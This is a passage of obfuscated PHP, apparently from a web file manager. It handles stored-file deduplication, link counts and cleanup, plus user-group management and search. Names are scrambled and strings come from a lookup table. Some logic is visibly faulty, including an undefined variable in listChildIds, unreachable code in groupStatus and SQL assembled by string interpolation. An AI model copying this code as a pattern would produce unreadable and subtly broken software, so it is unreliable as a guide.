strlen($çÁŒÒ½·[$Ö±¡¬ª[700]]) > 32) { $çÁŒÒ½·[$Ö±¡¬ª[79]] = intval(substr($çÁŒÒ½·[$Ö±¡¬ª[700]], 32)); } $î„Î»»« = $this->add($çÁŒÒ½·); return $this->find($î„Î»»«); } public function addFile($›¦Ìğˆ, $Ù“ı«ıç, $ƒåƒË­‘, $¡ß”‚òİ = false) { $º¤Šš¥ =& $_SERVER[áäÒ½¯Ç]; $†’ò¹û = IO::hashSimple($›¦Ìğˆ); $Ø­ò×å = IO::size($›¦Ìğˆ); $˜•ÆÆ²– = $Ø­ò×å <= 1024 * 1024 * 10 ? IO::hashMd5($›¦Ìğˆ) : $º¤Šš¥[12]; $„—Ü ’… = $º¤Šš¥[2196] . $†’ò¹û; CacheLock::lock($„—Ü ’…); if ($˜•ÆÆ²– && $†’ò¹û) { $†Â¬Àİˆ = $this->addFileCheckExist($†’ò¹û, $˜•ÆÆ²–, $Ø­ò×å); if ($†Â¬Àİˆ) { CacheLock::unlock($„—Ü ’…); return $†Â¬Àİˆ; } } $üß•¾À° = $this->addFileMake($›¦Ìğˆ, $Ù“ı«ıç, $Ø­ò×å, $†’ò¹û, $˜•ÆÆ²–, $ƒåƒË­‘, $¡ß”‚òİ); $Ç„ÖšÈå = $this->addFileData($üß•¾À°); if (!$Ç„ÖšÈå) { return !1; } CacheLock::unlock($„—Ü ’…); if (!$˜•ÆÆ²– && $Ç„ÖšÈå) { $this->fileMd5Check($Ç„ÖšÈå); } return $Ç„ÖšÈå; } public function fileMd5Check($À‰¶Ä³) { $‡áÓó =& $_SERVER[áäÒ½¯Ç]; $»ÜÌ¥™¢ = array($À‰¶Ä³[$‡áÓó[562]], $À‰¶Ä³[$‡áÓó[87]]); $æåİ¹æî = $‡áÓó[2197] . $À‰¶Ä³[$‡áÓó[87]]; $Î¹±Ãòú = $‡áÓó[2198] . $À‰¶Ä³[$‡áÓó[562]]; TaskQueue::add($‡áÓó[2199], $»ÜÌ¥™¢, $æåİ¹æî, $Î¹±Ãòú); } public function fileMd5Set($Çäà•Ö•, $•·ó¹ø) { $Ø£şõß =& $_SERVER[áäÒ½¯Ç]; $µ÷Ô¡¸§ = $this->find($Çäà•Ö•); if (!$µ÷Ô¡¸§ || $µ÷Ô¡¸§[$Ø£şõß[568]]) { return; } $€Ò†ôäì = IO::hashMd5($•·ó¹ø); if (!$€Ò†ôäì) { return $Ø£şõß[12]; } $this->where(array($Ø£şõß[562] => $Çäà•Ö•))->save(array($Ø£şõß[568] => $€Ò†ôäì)); } public function addFileMake($½¸”âÔ¶, $†©ñĞ£², $÷¿´€¡‡, $ïç÷ÈŞæ, $ï¢‚ØÍË, $ŒìÀ˜¹„, $­çÜŞè) { $ö«¸ô®É =& $_SERVER[áäÒ½¯Ç]; $ÜÃòÌŸí = $this->createFileName($ŒìÀ˜¹„, $†©ñĞ£², $ïç÷ÈŞæ, $ï¢‚ØÍË); $Å›Û×Äˆ = get_path_father($ÜÃòÌŸí); $Ê•‡ôÎ¼ = get_path_this($ÜÃòÌŸí); if ($­çÜŞè) { $¢„ş¤Î¹ = IO::move($½¸”âÔ¶, $Å›Û×Äˆ, !1, $Ê•‡ôÎ¼); } else { $¢„ş¤Î¹ = IO::copy($½¸”âÔ¶, $Å›Û×Äˆ, !1, $Ê•‡ôÎ¼); } if (!$¢„ş¤Î¹) { return !1; } $ççšÇ’È = IO::init($¢„ş¤Î¹); $ççšÇ’È->cacheMethod($ö«¸ô®É[180], $ççšÇ’È->path, $ö«¸ô®É[177]); if (IO::size($¢„ş¤Î¹) != $÷¿´€¡‡) { return !1; } $˜”İµö = array($ö«¸ô®É[645] => $÷¿´€¡‡, $ö«¸ô®É[2193] => 1, $ö«¸ô®É[514] => $ŒìÀ˜¹„, $ö«¸ô®É[918] => $†©ñĞ£²[$ö«¸ô®É[492]], $ö«¸ô®É[515] => $ÜÃòÌŸí, $ö«¸ô®É[2194] => $ïç÷ÈŞæ, $ö«¸ô®É[2195] => $ï¢‚ØÍË); return $˜”İµö; } public function addFileCheckExist($Šß²ÀÄã, $ö¢î±»ó, $îÑİ’Òã) { $«Æ¹ËüÆ =& $_SERVER[áäÒ½¯Ç]; $üÛé¥¯¿ = $this->findByHash($Šß²ÀÄã, $ö¢î±»ó); if (!$üÛé¥¯¿) { return !1; } $©Ä™Àêä = array($«Æ¹ËüÆ[2193] => intval($üÛé¥¯¿[$«Æ¹ËüÆ[2200]]) + 1, $«Æ¹ËüÆ[645] => $îÑİ’Òã); $this->where(array($«Æ¹ËüÆ[563] => $üÛé¥¯¿[$«Æ¹ËüÆ[562]]))->save($©Ä™Àêä); return $üÛé¥¯¿; } public function remove($§æ‡èãè) { $this->linkCountChange($§æ‡èãè, !1); $this->clearEmpty(); return !0; } public function linkAdd($ÌòŒñäª) { $this->linkCountChange($ÌòŒñäª, !0); } public function linkCountChange($ƒ•˜æÎš, $»ŸùÖë¿) { $çÛ›û¡ =& $_SERVER[áäÒ½¯Ç]; if (!$ƒ•˜æÎš) { return; } if (!is_array($ƒ•˜æÎš)) { $ƒ•˜æÎš = array($ƒ•˜æÎš); } $ª—ÍÖ­¸ = array(); foreach ($ƒ•˜æÎš as $ïáêÖ“Æ) { $ĞóØÍß® = $ïáêÖ“Æ . $çÛ›û¡[12]; if (!$ª—ÍÖ­¸[$ĞóØÍß®]) { $ª—ÍÖ­¸[$ĞóØÍß®] = 0; } $ª—ÍÖ­¸[$ĞóØÍß®]++; } $’äÉÒàù = array(); foreach ($ª—ÍÖ­¸ as $ïáêÖ“Æ => $¸–²ı™) { $ĞóØÍß® = $¸–²ı™ . $çÛ›û¡[12]; if (!$’äÉÒàù[$ĞóØÍß®]) { $’äÉÒàù[$ĞóØÍß®] = array(); } $’äÉÒàù[$ĞóØÍß®][] = $ïáêÖ“Æ; } foreach ($’äÉÒàù as $¸–²ı™ => $ƒÄŸöæ) { if (!$ƒÄŸöæ) { continue; } $¸–²ı™ = $»ŸùÖë¿ ? $¸–²ı™ : -intval($¸–²ı™); $Ó”Áöº’ = array($çÛ›û¡[562] => array($çÛ›û¡[7], $ƒÄŸöæ)); if ($¸–²ı™ < 0) { $Ó”Áöº’[$çÛ›û¡[2200]] = array($çÛ›û¡[1131], abs($¸–²ı™)); } $this->where($Ó”Áöº’)->setAdd($çÛ›û¡[2200], $¸–²ı™); } } public function findByHash($ —¦‚áÒ, $„ÍË× = false) { $‡Î¼™Ìã =& $_SERVER[áäÒ½¯Ç]; if (!$ —¦‚áÒ && !$„ÍË×) { return !1; } $°İô¯Ø’ = array($‡Î¼™Ìã[2194] => $ —¦‚áÒ); if ($„ÍË×) { $°İô¯Ø’ = array($‡Î¼™Ìã[2195] => $„ÍË×); } return $this->order($‡Î¼™Ìã[2201])->where($°İô¯Ø’)->find(); } public function clearEmpty($Ëıø“¾‘ = 1) { $‹ˆšÇÉ´ =& $_SERVER[áäÒ½¯Ç]; $“ø¿¦” = time() - 3600 * 24 * $Ëıø“¾‘; $©„ÀîÃ† = $‹ˆšÇÉ´[2202] . $“ø¿¦”; $Ü»«Ãåí = $this->where($©„ÀîÃ†)->select(); if (!$Ü»«Ãåí) { return; } $æ‰Ì§Í× = new Task($‹ˆšÇÉ´[2203], $‹ˆšÇÉ´[12], count($Ü»«Ãåí)); foreach ($Ü»«Ãåí as $‘¼ğº›Ò) { $æ‰Ì§Í×->update(1); $this->resetFile($‘¼ğº›Ò); } $æ‰Ì§Í×->end(); } public function resetFile($Üòı¨Àƒ) { $†ìÔ˜“ =& $_SERVER[áäÒ½¯Ç]; $âµ¢æï™ = array($†ìÔ˜“[563] => $Üòı¨Àƒ[$†ìÔ˜“[562]]); $ Å§á–— = Model($†ìÔ˜“[1482])->where($âµ¢æï™)->count(); $½¢ö«¾ç = Model($†ìÔ˜“[2204])->where($âµ¢æï™)->count(); $²·áõ« = intval($ Å§á–—) + intval($½¢ö«¾ç); if ($²·áõ« == 0) { Model($†ìÔ˜“[2205])->delete($Üòı¨Àƒ[$†ìÔ˜“[562]]); $this->where($âµ¢æï™)->delete(); $this->metaSet($Üòı¨Àƒ[$†ìÔ˜“[562]], null, null); if (!IO::isFile($Üòı¨Àƒ[$†ìÔ˜“[87]])) { write_log(array($†ìÔ˜“[2206], ACTION, $Üòı¨Àƒ), $†ìÔ˜“[1317]); return !1; } IO::remove($Üòı¨Àƒ[$†ìÔ˜“[87]]); write_log(ACTION . $†ìÔ˜“[943] . KodUser::id() . $†ìÔ˜“[2207] . $Üòı¨Àƒ[$†ìÔ˜“[562]] . $†ìÔ˜“[1996] . $Üòı¨Àƒ[$†ìÔ˜“[79]] . $†ìÔ˜“[200] . $Üòı¨Àƒ[$†ìÔ˜“[87]], $†ìÔ˜“[2206]); return; } if ($Üòı¨Àƒ[$†ìÔ˜“[2200]] != $²·áõ«) { $this->where($âµ¢æï™)->save(array($†ìÔ˜“[2193] => $²·áõ«)); } } public function storageInfo($ßâ‹ä´Ê = false) { $ÉÓ³ =& $_SERVER[áäÒ½¯Ç]; $‡â¼øÑ = $this->count() + 0.0; $˜Ğ³È­ = 0; $”Ù‘ÆÙ = 1; $æİ©ôï… = 0; $»Ø‹Ûğ“ = 5000; for ($µì«›‚ã = 0; $µì«›‚ã < $‡â¼øÑ; $µì«›‚ã = $µì«›‚ã + $»Ø‹Ûğ“) { $æ”êÙğü = $this->limit($µì«›‚ã, $µì«›‚ã + $»Ø‹Ûğ“)->select(); foreach ($æ”êÙğü as $‘˜—ïøî) { $”Ù‘ÆÙ += $‘˜—ïøî[$ÉÓ³[79]] * $‘˜—ïøî[$ÉÓ³[2200]]; $˜Ğ³È­ += $‘˜—ïøî[$ÉÓ³[79]] * ($‘˜—ïøî[$ÉÓ³[2200]] - 1); $æİ©ôï… += $‘˜—ïøî[$ÉÓ³[2200]]; } } $àæœÉí¨ = array($ÉÓ³[2208] => $”Ù‘ÆÙ, $ÉÓ³[2209] => $˜Ğ³È­, $ÉÓ³[2210] => $˜Ğ³È­ / $”Ù‘ÆÙ, $ÉÓ³[83] => $‡â¼øÑ, $ÉÓ³[2211] => $æİ©ôï…); return $àæœÉí¨; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\x75\160"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\x61\155\x65" => "\147\162\x6f\165\160\x5f\155\145\x74\x61", "\155\x65\x74\141\106\x69\145\x6c\x64" => "\147\x72\x6f\165\160\x49\x44"); protected function cacheFunctionAlias($¢¢µñ³à) { $›©À²ğÂ =& $_SERVER[áäÒ½¯Ç]; return array($›©À²ğÂ[2212] => array($¢¢µñ³à[0], $›©À²ğÂ[2213]), $›©À²ğÂ[2214] => array($¢¢µñ³à[0], $›©À²ğÂ[2215])); } protected function ___getInfo($Ìö‚Ä´) { $ÒØÏ“˜ = $this->getInfoSimple($Ìö‚Ä´); if (!$ÒØÏ“˜) { return !1; } return $this->_listDataApplyItem($ÒØÏ“˜); } protected function ___getInfoSimple($ÃÁı¡ñÑ) { $äµÑƒ”ö = array($_SERVER[áäÒ½¯Ç][1444] => intval($ÃÁı¡ñÑ)); $ ¿úúÜ’ = $this->where($äµÑƒ”ö)->find(); return is_array($ ¿úúÜ’) ? $ ¿úúÜ’ : array(); } protected function groupAdd($¤²üÁÏ©) { $¢Ò°ã× =& $_SERVER[áäÒ½¯Ç]; if (!$¤²üÁÏ©[$¢Ò°ã×[191]] && isset($¤²üÁÏ©[$¢Ò°ã×[1444]]) && $¤²üÁÏ©[$¢Ò°ã×[1444]] == 1) { if ($íĞ¶Ö Ş = $this->getInfoSimple($¤²üÁÏ©[$¢Ò°ã×[1444]], !0)) { return $¤²üÁÏ©[$¢Ò°ã×[1444]]; } } else { $íĞ¶Ö Ş = $this->getInfoSimple($¤²üÁÏ©[$¢Ò°ã×[191]]); if (!$íĞ¶Ö Ş) { return !1; } } $ÑÈËµäñ = $¢Ò°ã×[618]; if ($íĞ¶Ö Ş[$¢Ò°ã×[609]]) { $ÑÈËµäñ = $íĞ¶Ö Ş[$¢Ò°ã×[609]] . $íĞ¶Ö Ş[$¢Ò°ã×[1444]] . $¢Ò°ã×[50]; } $éäìÂ˜õ = array($¢Ò°ã×[514] => $this->groupNameAuto($¤²üÁÏ©[$¢Ò°ã×[191]], $¤²üÁÏ©[$¢Ò°ã×[32]]), $¢Ò°ã×[497] => $¤²üÁÏ©[$¢Ò°ã×[191]], $¢Ò°ã×[680] => $ÑÈËµäñ, $¢Ò°ã×[2216] => $¤²üÁÏ©[$¢Ò°ã×[2120]], $¢Ò°ã×[2217] => 0, $¢Ò°ã×[2137] => 0); $¤²üÁÏ©[$¢Ò°ã×[32]] = $éäìÂ˜õ[$¢Ò°ã×[32]]; if (isset($¤²üÁÏ©[$¢Ò°ã×[2155]])) { $éäìÂ˜õ[$¢Ò°ã×[2155]] = $¤²üÁÏ©[$¢Ò°ã×[2155]]; } else { $¹«ò”¦³ = $this->max($¢Ò°ã×[2155]); if (!$¹«ò”¦³) { $¹«ò”¦³ = 0; } $éäìÂ˜õ[$¢Ò°ã×[2155]] = $¹«ò”¦³ + 1; } if (!empty($¤²üÁÏ©[$¢Ò°ã×[1444]])) { $éäìÂ˜õ[$¢Ò°ã×[1444]] = $¤²üÁÏ©[$¢Ò°ã×[1444]]; } $Œöè… = $this->add($éäìÂ˜õ); $this->groupMetaEdit($Œöè…, $¤²üÁÏ©); Model($¢Ò°ã×[1482])->groupRootAdd($Œöè…); $this->_clearCache($¤²üÁÏ©[$¢Ò°ã×[191]]); return $Œöè…; } protected function groupEdit($ŠÄš˜ì‹, $Ş’¿œ¢·) { $–€•ıõÁ =& $_SERVER[áäÒ½¯Ç]; $èÓ“¯Ôı = $this->getInfoSimple($ŠÄš˜ì‹); if (!$èÓ“¯Ôı) { return !1; } if (!empty($Ş’¿œ¢·[$–€•ıõÁ[191]])) { $¾àÃ×©µ = $this->getInfoSimple($Ş’¿œ¢·[$–€•ıõÁ[191]]); if (!$¾àÃ×©µ) { return !1; } if ($èÓ“¯Ôı[$–€•ıõÁ[1444]] == $¾àÃ×©µ[$–€•ıõÁ[1444]]) { return !1; } if ($Ş’¿œ¢·[$–€•ıõÁ[191]] != $èÓ“¯Ôı[$–€•ıõÁ[191]]) { if ($¾àÃ×©µ[$–€•ıõÁ[609]] !== $èÓ“¯Ôı[$–€•ıõÁ[609]] && strpos($¾àÃ×©µ[$–€•ıõÁ[609]], $èÓ“¯Ôı[$–€•ıõÁ[609]] . $èÓ“¯Ôı[$–€•ıõÁ[1444]] . $–€•ıõÁ[50]) === 0) { return !1; } $Ş’¿œ¢·[$–€•ıõÁ[680]] = $¾àÃ×©µ[$–€•ıõÁ[609]] . $Ş’¿œ¢·[$–€•ıõÁ[191]] . $–€•ıõÁ[50]; $this->_changeChildLevel($èÓ“¯Ôı, $¾àÃ×©µ); $this->_clearCache($¾àÃ×©µ[$–€•ıõÁ[1444]]); $this->_clearCache($èÓ“¯Ôı[$–€•ıõÁ[191]]); } } $this->groupMetaEdit($ŠÄš˜ì‹, $Ş’¿œ¢·); $this->_clearChildrenCache($èÓ“¯Ôı); return $this->where(array($–€•ıõÁ[2218] => $ŠÄš˜ì‹))->save($Ş’¿œ¢·); } private function groupMetaEdit($È‚’±æÌ, &$òÈÉÆ¡›) { $‡Ú¯Ù =& $_SERVER[áäÒ½¯Ç]; if (isset($òÈÉÆ¡›[$‡Ú¯Ù[32]])) { $this->setNamePinyin($È‚’±æÌ, $òÈÉÆ¡›[$‡Ú¯Ù[32]]); } if (isset($òÈÉÆ¡›[$‡Ú¯Ù[2219]])) { $ö¥ŠÁ› = array($‡Ú¯Ù[2219] => $òÈÉÆ¡›[$‡Ú¯Ù[2219]], $‡Ú¯Ù[2220] => $òÈÉÆ¡›[$‡Ú¯Ù[2220]]); unset($òÈÉÆ¡›[$‡Ú¯Ù[2219]]); unset($òÈÉÆ¡›[$‡Ú¯Ù[2220]]); if (isset($òÈÉÆ¡›[$‡Ú¯Ù[2221]])) { $ƒ®ÍóóÅ = $‡Ú¯Ù[1440] . $È‚’±æÌ; $„¾°¼Ê = $‡Ú¯Ù[1439]; $°±ùñæË = $òÈÉÆ¡›[$‡Ú¯Ù[2221]] ? $òÈÉÆ¡›[$‡Ú¯Ù[2221]] : $‡Ú¯Ù[12]; $ÇÃòıä = Model($‡Ú¯Ù[1438])->get($ƒ®ÍóóÅ, $„¾°¼Ê); $ÇÃòıä = $ÇÃòıä ? $ÇÃòıä : $‡Ú¯Ù[12]; if ($ÇÃòıä != $°±ùñæË) { if (!$°±ùñæË && $ÇÃòıä) { Model($‡Ú¯Ù[1438])->remove($ƒ®ÍóóÅ, $„¾°¼Ê); } else { if ($°±ùñæË) { Model($‡Ú¯Ù[1438])->set($ƒ®ÍóóÅ, $°±ùñæË, $„¾°¼Ê); } } } $ö¥ŠÁ›[$‡Ú¯Ù[2221]] = $°±ùñæË; } $this->metaSet($È‚’±æÌ, $ö¥ŠÁ›); } } private function _clearChildrenCache($‹ĞîÖË«) { $ì—€Ô· =& $_SERVER[áäÒ½¯Ç]; $‰Ç±¥Å = array($ì—€Ô·[680] => array($ì—€Ô·[640], $‹ĞîÖË«[$ì—€Ô·[609]] . $‹ĞîÖË«[$ì—€Ô·[1444]] . $ì—€Ô·[641])); $¢”ÁãÃÜ = $this->field($ì—€Ô·[1444])->where($‰Ç±¥Å)->select(); foreach ($¢”ÁãÃÜ as $ì‚¬«ü¥) { $this->_clearCache($ì‚¬«ü¥[$ì—€Ô·[1444]]); } } private function _clearCache($Ç³«á®¸) { $ÎæÖº´ =& $_SERVER[áäÒ½¯Ç]; $this->cacheFunctionClear($ÎæÖº´[2222], $Ç³«á®¸); $this->cacheFunctionClear($ÎæÖº´[2223], $Ç³«á®¸); } private function _changeChildLevel($ßöÍ·Á‘, $ìßæàç, $ÑØˆ À“ = false) { $úàëÕÍÇ =& $_SERVER[áäÒ½¯Ç]; $¦É™Ç¡Â = $ßöÍ·Á‘[$úàëÕÍÇ[609]] . $ßöÍ·Á‘[$úàëÕÍÇ[1444]] . $úàëÕÍÇ[50]; $·ë§¾æë = $ìßæàç[$úàëÕÍÇ[609]] . $ìßæàç[$úàëÕÍÇ[1444]] . $úàëÕÍÇ[50] . $ßöÍ·Á‘[$úàëÕÍÇ[1444]] . $úàëÕÍÇ[50]; if ($ÑØˆ À“) { $·ë§¾æë = $ìßæàç[$úàëÕÍÇ[609]] . $ìßæàç[$úàëÕÍÇ[1444]] . $úàëÕÍÇ[50]; } $œ¤²÷Ø® = array($úàëÕÍÇ[680] => array($úàëÕÍÇ[640], $ßöÍ·Á‘[$úàëÕÍÇ[609]] . $ßöÍ·Á‘[$úàëÕÍÇ[1444]] . $úàëÕÍÇ[641])); $©¿–”áï = array($úàëÕÍÇ[680] => array($úàëÕÍÇ[689], "\162\145\x70\x6c\141\143\x65\50\x70\141\162\145\156\164\x4c\145\x76\145\154\54\x27{$¦É™Ç¡Â}\47\x2c\47{$·ë§¾æë}\x27\51")); $this->_clearChildrenCache($ßöÍ·Á‘); $this->where($œ¤²÷Ø®)->data($©¿–”áï)->save(); } public function setNamePinyin($õ‹…»’Ï, $éÀÔëÇØ = false) { $–Ÿ˜ú¥ë =& $_SERVER[áäÒ½¯Ç]; if (!$éÀÔëÇØ) { $Òú¥Ù•Â = $this->getInfoSimple($õ‹…»’Ï); $éÀÔëÇØ = $Òú¥Ù•Â[$–Ÿ˜ú¥ë[32]]; } if (!Input::check($éÀÔëÇØ, $–Ÿ˜ú¥ë[683])) { $this->metaSet($õ‹…»’Ï, $–Ÿ˜ú¥ë[557], null); $this->metaSet($õ‹…»’Ï, $–Ÿ˜ú¥ë[556], null); return; } $šı¾“ ˜ = array($–Ÿ˜ú¥ë[557] => str_replace($–Ÿ˜ú¥ë[53], $–Ÿ˜ú¥ë[12], Pinyin::get($éÀÔëÇØ)), $–Ÿ˜ú¥ë[556] => Pinyin::get($éÀÔëÇØ, $–Ÿ˜ú¥ë[684])); $this->metaSet($õ‹…»’Ï, $šı¾“ ˜); } protected function metaSet($å±‰İá , $¾§ıæíÃ = null, $¼­Õ¹™ = null) { $this->_clearCache($å±‰İá ); return parent::metaSet($å±‰İá , $¾§ıæíÃ, $¼­Õ¹™); } protected function groupStatus($ğÉÆ¦¢, $é‘—¤Ò…) { $½³‡·É =& $_SERVER[áäÒ½¯Ç]; $¾¬´Ö£¥ = $this->getInfoSimple($ğÉÆ¦¢); if (!$¾¬´Ö£¥) { return !1; } $this->_clearCache($ğÉÆ¦¢); return $this->metaSet($ğÉÆ¦¢, $½³‡·É[852], $é‘—¤Ò…); if ($é‘—¤Ò… == $½³‡·É[91]) { $ìÄÕÃ–Ã = $this->parentLevelArray($¾¬´Ö£¥[$½³‡·É[609]]); } else { } $ìÄÕÃ–Ã[] = $¾¬´Ö£¥[$½³‡·É[1444]]; $êÓ„©æë = array(); foreach ($ìÄÕÃ–Ã as $ğÉÆ¦¢) { $êÓ„©æë[] = array($½³‡·É[1444] => $ğÉÆ¦¢, $½³‡·É[95] => $½³‡·É[852], $½³‡·É[460] => $é‘—¤Ò…); $this->_clearCache($ğÉÆ¦¢); } return Model($½³‡·É[2224])->addAll($êÓ„©æë, array(), !0); } protected function groupRemove($‡Ëç—× , $¨İª¾ó£ = false) { $¦é´ê¸Ö =& $_SERVER[áäÒ½¯Ç]; $ÅÒ±Ü¹Ò = array($¦é´ê¸Ö[1444] => $‡Ëç—× ); $’¨ Æºö = $this->where($ÅÒ±Ü¹Ò)->find(); if (!$’¨ Æºö || $’¨ Æºö[$¦é´ê¸Ö[191]] == 0) { return !1; } if (!$¨İª¾ó£) { $­ÌÙóî“ = $this->getInfoSimple($’¨ Æºö[$¦é´ê¸Ö[191]]); $this->_changeChildLevel($’¨ Æºö, $­ÌÙóî“, !0); $this->where(array($¦é´ê¸Ö[191] => $‡Ëç—× ))->save(array($¦é´ê¸Ö[191] => $’¨ Æºö[$¦é´ê¸Ö[191]])); $this->_clearCache($­ÌÙóî“[$¦é´ê¸Ö[1444]]); } Model($¦é´ê¸Ö[2224])->where($ÅÒ±Ü¹Ò)->delete(); Model($¦é´ê¸Ö[2225])->where($ÅÒ±Ü¹Ò)->delete(); Model($¦é´ê¸Ö[935])->groupRootRemove($‡Ëç—× ); $this->_clearCache($’¨ Æºö[$¦é´ê¸Ö[191]]); return $this->where($ÅÒ±Ü¹Ò)->delete(); } protected function groupSort($õÜÑ—) { $ßø®ÊÎƒ =& $_SERVER[áäÒ½¯Ç]; $Äê¯›Îú = array(); foreach ($õÜÑ— as $ Åœ¸ËÃ => $…À˜şÆ›) { $Äê¯›Îú[] = array($ßø®ÊÎƒ[1444], $…À˜şÆ›, $ßø®ÊÎƒ[2155], $ Åœ¸ËÃ + 1); } $this->saveAll($Äê¯›Îú); } public function listData() { $ÁĞïÆÑ§ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÁĞïÆÑ§[$_SERVER[áäÒ½¯Ç][455]]); return $ÁĞïÆÑ§; } private function _makeOrder($Êàƒîº = '') { $ëê‡©Ó =& $_SERVER[áäÒ½¯Ç]; $ã«û† = array($ëê‡©Ó[1444], $ëê‡©Ó[32], $ëê‡©Ó[2122], $ëê‡©Ó[242]); $°ªÛı§¬ = array($ëê‡©Ó[542] => $ëê‡©Ó[543], $ëê‡©Ó[544] => $ëê‡©Ó[545]); $à‡¢²ú² = Input::get($ëê‡©Ó[549], $ëê‡©Ó[7], $ëê‡©Ó[2137], $ã«û†); $®ŸÁ¢¶ = Input::get($ëê‡©Ó[550], $ëê‡©Ó[7], $ëê‡©Ó[2226], array($ëê‡©Ó[2226], $ëê‡©Ó[544])); $®ŸÁ¢¶ = $°ªÛı§¬[$®ŸÁ¢¶]; $Êàƒîº = $Êàƒîº . "{$à‡¢²ú²}\40{$®ŸÁ¢¶}\54\x20\147\162\157\165\160\111\104\40\141\163\x63"; return $this->order($Êàƒîº); } public function listChild($†¨–ø¦´) { $µÜ¬ºö =& $_SERVER[áäÒ½¯Ç]; $ë¸ªªè» = $this->where(array($µÜ¬ºö[191] => $†¨–ø¦´))->_makeOrder()->selectPage(200); $this->_listDataApply($ë¸ªªè»[$µÜ¬ºö[455]]); return $ë¸ªªè»; } public function listChildIds($Ÿ­ªÂü) { $ñÜÂ¦º­ =& $_SERVER[áäÒ½¯Ç]; if (is_string($Ñµş„™ü)) { $Ÿ­ªÂü = explode($ñÜÂ¦º­[50], $Ÿ­ªÂü); } $ûüÑªú„ = $this->where(array($ñÜÂ¦º­[1444] => array($ñÜÂ¦º­[7], $Ÿ­ªÂü)))->field($ñÜÂ¦º­[2227])->select(); if (!$ûüÑªú„) { return !1; } $¢¯Ä¡°‚ = array(); foreach ($ûüÑªú„ as $ÜˆşÅ»—) { $¢¯Ä¡°‚[] = "\163\x65\154\x65\x63\164\40\147\162\x6f\x75\160\x49\x44\40\x66\162\157\x6d\x20\x60\x67\x72\x6f\x75\x70\140\x20\x77\150\x65\x72\x65\40\x70\141\162\x65\156\x74\x4c\x65\166\x65\154\x20\x6c\x69\153\x65\x20\x27{$ÜˆşÅ»—[$ñÜÂ¦º­[609]]}{$ÜˆşÅ»—[$ñÜÂ¦º­[1444]]}\54\45\47"; } $¢¯Ä¡°‚ = implode($ñÜÂ¦º­[2228], $¢¯Ä¡°‚); $ûüÑªú„ = $this->query($¢¯Ä¡°‚); if (!$ûüÑªú„) { return array(); } $Ÿ­ªÂü = array_to_keyvalue($ûüÑªú„, $ñÜÂ¦º­[12], $ñÜÂ¦º­[1444]); return array_unique($Ÿ­ªÂü); } public function listByID($ÃĞÛëÇ) { $Ğç‰çíÎ =& $_SERVER[áäÒ½¯Ç]; if (!$ÃĞÛëÇ) { return array(); } $³ƒ¸½¶ = array($Ğç‰çíÎ[1444] => array($Ğç‰çíÎ[7], $ÃĞÛëÇ)); $Ò§¨–ßÀ = $this->where($³ƒ¸½¶)->select(); $Ò§¨–ßÀ = array_sort_keep($Ò§¨–ßÀ, $Ğç‰çíÎ[1444], $ÃĞÛëÇ); $this->_listDataApply($Ò§¨–ßÀ); return $Ò§¨–ßÀ; } public function listSearch($€ªğ€êª) { $†ù¿Ñó£ =& $_SERVER[áäÒ½¯Ç]; $¿¸˜„ÎÏ = trim($€ªğ€êª[$†ù¿Ñó£[2229]]); $ñˆşşÔ³ = explode($†ù¿Ñó£[53], $¿¸˜„ÎÏ); if (!$¿¸˜„ÎÏ || count($ñˆşşÔ³) == 1) { return $this->listSearchNow($€ªğ€êª); } $™ªµ—Ö¬ = array($†ù¿Ñó£[455] => array()); foreach ($ñˆşşÔ³ as $¦´ïÒãÁ) { if (!trim($¦´ïÒãÁ)) { continue; } $€ªğ€êª[$†ù¿Ñó£[2229]] = $¦´ïÒãÁ; $«µ…´Óö = $this->listSearchNow($€ªğ€êª); $™ªµ—Ö¬[$†ù¿Ñó£[455]] = array_merge($™ªµ—Ö¬[$†ù¿Ñó£[455]], $«µ…´Óö[$†ù¿Ñó£[455]]); } $™ªµ—Ö¬[$†ù¿Ñó£[455]] = array_unique_by_key($™ªµ—Ö¬[$†ù¿Ñó£[455]], $†ù¿Ñó£[1444]); $™ªµ—Ö¬[$†ù¿Ñó£[452]] = array($†ù¿Ñó£[453] => count($™ªµ—Ö¬[$†ù¿Ñó£[455]]), $†ù¿Ñó£[449] => 20, $†ù¿Ñó£[438] => 1, $†ù¿Ñó£[454] => 1); return $™ªµ—Ö¬; } public function listSearchNow($‡±¤Ù¨») { $ØµÇáş =& $_SERVER[áäÒ½¯Ç]; $œâÈÜ¤Ï = trim($‡±¤Ù¨»[$ØµÇáş[2229]]); $•÷”•Ü„ = isset($‡±¤Ù¨»[$ØµÇáş[2230]]) ? $‡±¤Ù¨»[$ØµÇáş[2230]] : !1; if (!trim($œâÈÜ¤Ï)) { return !1; } $œâÈÜ¤Ï = str_replace($ØµÇáş[2231], $ØµÇáş[2232], $œâÈÜ¤Ï); $ÓÓ·ú£ = array($ØµÇáş[1444] => array($ØµÇáş[479], "{$œâÈÜ¤Ï}\x25"), $ØµÇáş[32] => array($ØµÇáş[479], "\x25{$œâÈÜ¤Ï}\45"), $ØµÇáş[1116] => $ØµÇáş[2233]); if ($•÷”•Ü„) { $À†¬º  = $this->getInfoSimple($•÷”•Ü„); $´¨Ã¶§¿ = $À†¬º [$ØµÇáş[609]] . $•÷”•Ü„ . $ØµÇáş[641]; $ÓÓ·ú£ = array($ÓÓ·ú£, array($ØµÇáş[609] => array($ØµÇáş[479], $´¨Ã¶§¿))); } $ÓÓ·ú£ = $this->parseWhereLike($ÓÓ·ú£); $ñ¨Êğ×ˆ = $this->_makeOrder()->where($ÓÓ·ú£)->selectPage(20); $ñ¨Êğ×ˆ = $ñ¨Êğ×ˆ ? $ñ¨Êğ×ˆ : array($ØµÇáş[455] => array(), $ØµÇáş[452] => array()); if (!$ñ¨Êğ×ˆ || count($ñ¨Êğ×ˆ[$ØµÇáş[455]]) < 5 && Input::check($œâÈÜ¤Ï, $ØµÇáş[403])) { $‘Åª¥²ê = $this->groupChildrenAll($•÷”•Ü„); $”¶ö›€î = $this->_searchFromMeta($ØµÇáş[556], $œâÈÜ¤Ï, 10, $‘Åª¥²ê); $«Â›Ç = $this->_searchFromMeta($ØµÇáş[557], $œâÈÜ¤Ï, 10, $‘Åª¥²ê); $“ÉåÖíµ = array_merge($”¶ö›€î, $«Â›Ç, $ñ¨Êğ×ˆ[$ØµÇáş[455]]); $ñ¨Êğ×ˆ[$ØµÇáş[455]] = array_unique_by_key($“ÉåÖíµ, $ØµÇáş[1444]); $ñ¨Êğ×ˆ[$ØµÇáş[452]][$ØµÇáş[453]] = 